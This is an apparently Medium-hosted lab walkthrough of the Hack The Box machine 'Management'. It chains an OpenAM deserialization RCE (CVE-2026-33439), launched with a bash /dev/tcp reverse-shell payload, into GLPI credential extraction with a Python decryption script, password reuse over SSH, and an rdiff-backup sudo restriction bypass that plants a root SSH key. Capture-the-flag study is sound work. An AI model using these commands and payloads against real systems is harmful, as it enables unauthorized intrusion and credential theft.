@@ -1,0 +1,269 @@
+
+
+Alright, let’s start with some basic enumeration by running an Nmap scan against the target.
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
+80/tcp    open  http        nginx 1.24.0 (Ubuntu)
+443/tcp   open  ssl/http    nginx 1.24.0 (Ubuntu)
+4444/tcp  open  ssl/krb524?
+50389/tcp open  ldap        (Anonymous bind OK)
+From the scan results, we can see several open ports.
+
+We can see that ports 80 and 443 are open, so there’s a web server running on the target. Let’s check out port 80 first and see what we can find.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Going to management.htb gives us an error because the hostname isn't resolving, so let's add it to our /etc/hosts file.
+
+
+Now that management.htb resolves to the target IP, let's head back to the site and see what we have.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+We get a webpage, but after looking around, there doesn’t seem to be anything too interesting.
+
+There is however a Client Login button in the top-right corner.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Clicking it takes us to sso.management.htb, which doesn't resolve yet, so let's add that to our /etc/hosts file as well.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+We get a login page and can see that it is running OpenAM.
+
+Looking into it a bit more, we find that the OpenAM version is 16.0.5.
+
+After some searching, we find CVE-2026–33439, a critical pre-authentication Remote Code Execution (RCE) vulnerability affecting OpenAM 16.0.5 and earlier.
+
+The vulnerability is caused by unsafe Java deserialization in the jato.clientSession parameter.
+
+An attacker can send a specially crafted serialized Java object to a vulnerable JATO endpoint and execute commands on the server without needing to authenticate first.
+
+Since our target is running version 16.0.5, it should be vulnerable, so let’s try exploiting it.
+
+We found a PoC for CVE-2026–33439.
+
+Looking through the exploit, we can see that it tests multiple OpenAM UI endpoints, including /ui/PWResetUserValidation.
+
+Since we already know that OpenAM is running under the /openam path, we tested
+
+<https://sso.management.htb/openam/ui/PWResetUserValidation>
+This endpoint successfully accepted the JATO payload, so we can use it to attempt command execution on the target.
+
+First, we set up a listener on our attacking machine
+
+nc -lnvp 4444
+Then we run the exploit, telling it to execute a reverse shell back to our machine.
+
+python3 Exploit_CVE_2026_33439.py \
+  --url '<https://sso.management.htb/openam>' \
+  --jars ./Jars \
+  --endpoint /ui/PWResetUserValidation \
+  --command 'bash -i >& /dev/tcp/<your ip>/4444 0>&1'
+If everything works, we should get a connection back in our Netcat listener and land in a shell on the target as the openam user
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+After getting the openam shell, we moved on to local enumeration to figure out how to escalate to root.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Seems like to get our first flag user.txtwe need to access as user owen.
+
+Now that we have a shell as openam, let's start enumerating the local system to see what we can find.
+
+Checking SUID binaries, capabilities, cron jobs, and sudo access all came up empty, just the standard Ubuntu set.
+
+Since this is a managed IT services box, it made sense to check if any other applications were running locally.
+
+Poking around /opt, we find a GLPI installation at /opt/glpi.
+
+Looking at its config file:
+
+cat /opt/glpi/config/config_db.php
+gives us a set of database credentials:
+
+user: glpi
+pass: 8rhu0L6Pw4Y7
+db:   glpidb
+host: 127.0.0.1
+MariaDB is listening locally on 127.0.0.1:3306, so let's connect with these credentials and see what's inside.
+
+mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "show tables;"
+Browsing through the tables, glpi_users gives us a handful of bcrypt password hashes, but none of them belong to a user called owen they're all standard GLPI accounts (glpi, post-only, tech, normal), so that's a dead end on its own.
+
+The more interesting table turns out to be glpi_authldaps, which stores GLPI's LDAP integration settings.
+
+mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SELECT * FROM glpi_authldaps\G"
+This reveals a service account bind DN and an encrypted password
+
+rootdn: cn=svc-glpi,ou=services,dc=management,dc=htb
+rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
+GLPI encrypts sensitive config fields like this using a locally stored key file, /opt/glpi/config/glpicrypt.key.
+
+Write on Medium
+Reading GLPI’s own source (/opt/glpi/src/GLPIKey.php) confirms it uses libsodium's XChaCha20-Poly1305-IETF AEAD construction, where the first 24 bytes of the base64-decoded value are the nonce.
+
+To decrypt it, we first need the key file on our attacking machine.
+
+Since we can read it as openam, we spin up a quick HTTP server on the target:
+
+cd /opt/glpi/config
+python3 -m http.server 8888
+and grab it from Kali
+
+wget http://<target-ip>:8888/glpicrypt.key
+With the key in hand, we can decrypt the LDAP password using a python script.
+
+import nacl.bindings, base64
+with open('glpicrypt.key', 'rb') as f:
+    key = f.read()
+encrypted = base64.b64decode('avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==')
+NONCE_SIZE = nacl.bindings.crypto_aead_xchacha20poly1305_ietf_NPUBBYTES  # 24
+nonce = encrypted[:NONCE_SIZE]
+ciphertext = encrypted[NONCE_SIZE:]
+plaintext = nacl.bindings.crypto_aead_xchacha20poly1305_ietf_decrypt(
+    ciphertext, nonce, nonce, key
+)
+print(plaintext.decode())
+Running this gives us the plaintext password.
+
+
+This is a service account password rather than owen's directly, but service account credential reuse is a common pattern on these boxes, so it's worth a shot.
+
+We open up SSH and just try logging in as owen using the password we got.
+
+Press enter or click to view image in full size
+
+And boom, we’re in. Let’s grab that sweet first flag.
+
+
+Nice, user done. Now let’s move on to privilege escalation.
+
+First thing we check is sudo -l
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+So we can run rdiff-backup as root, but only in server mode, restricted to /opt/backup, read-only.
+
+This is a classic setup for the rdiff-backup restrict-path bypass, so let’s see if we can break out of that restriction.
+
+The sudo rule looks like this:
+
+(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
+The key thing here is that trailing *.
+
+Sudo only checks that the command literally starts with that string , it doesn’t care what comes after.
+
+And since we control --remote-schema, we control the entire server-side command line.
+
+rdiff-backup uses argparse, and argparse takes the last occurrence of a flag when you pass it twice.
+
+So we append a second --restrict-mode read-write after the required read-only
+
+rdiff-backup \
+  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --remote-tempdir %s --restrict-mode read-write' \
+  --list-increments \
+  dummyhost::/opt/backup
+That works. Now we apply the same trick to --restrict-path and point it at /root
+
+rdiff-backup \
+  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --remote-tempdir %s --restrict-mode read-write --restrict-path /root' \
+  dummyhost::/root \
+  /tmp/rootgrab
+We now have root’s home directory mirrored locally.
+
+Let’s get a proper shell , generate an SSH keypair.
+
+ssh-keygen -t ed25519 -f /tmp/htbkey -N ''
+Stage the authorized_keys
+
+mkdir -p /tmp/fakessh
+cat /tmp/htbkey.pub > /tmp/fakessh/authorized_keys
+chmod 700 /tmp/fakessh
+chmod 600 /tmp/fakessh/authorized_keys
+Now push it into /root/.ssh.
+
+We need --user-mapping-file here because rdiff-backup preserves source file ownership , without it the files land owned by owen and SSH rejects them.
+
+Note the mapping format uses colons.
+
+echo 'owen:root' > /tmp/usermap
+echo 'owen:root' > /tmp/groupmap
+rdiff-backup --force \
+  --user-mapping-file /tmp/usermap \
+  --group-mapping-file /tmp/groupmap \
+  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --remote-tempdir %s --restrict-mode read-write --restrict-path /root' \
+  /tmp/fakessh \
+  dummyhost::/root/.ssh
+And then
+
+ssh -i /tmp/htbkey root@management.htb
+And BOOM! We are in as root.
+
+
+Let’s grab the flag
+
+cat /root/root.txt
+And, box SOLVED!
+
+Full chain start to finish:
+
+OpenAM JATO deserialization RCE (CVE-2026-33439)
+        │
+        ▼
+Low-privileged shell as openam
+        │
+        ▼
+GLPI database credentials in /opt/glpi/config/config_db.php
+        │
+        ▼
+Encrypted svc-glpi LDAP password recovered from glpi_authldaps table
+        │
+        ▼
+Decrypted with libsodium XChaCha20 using glpicrypt.key
+        │
+        ▼
+Password reused for local user owen, grab user.txt
+        │
+        ▼
+sudo rule allows rdiff-backup --server restricted to /opt/backup read-only
+        │
+        ▼
+Argparse last-flag-wins bypasses both --restrict-mode and --restrict-path
+        │
+        ▼
+rdiff-backup server runs as root with unrestricted filesystem access
+        │
+        ▼
+SSH keypair staged with --user-mapping-file to force root ownership
+        │
+        ▼
+authorized_keys written to /root/.ssh via rdiff-backup backup mode
+        │
+        ▼
+SSH in as root, grab root.txt
+I decided to write this walkthrough because when I was working through the box I couldn’t find any writeups for it anywhere.
+
+Hopefully this helps someone who gets stuck on the same parts I did, especially the GLPI decryption and the rdiff-backup bypass since those took me the longest to figure out.
+
+
+
+
+
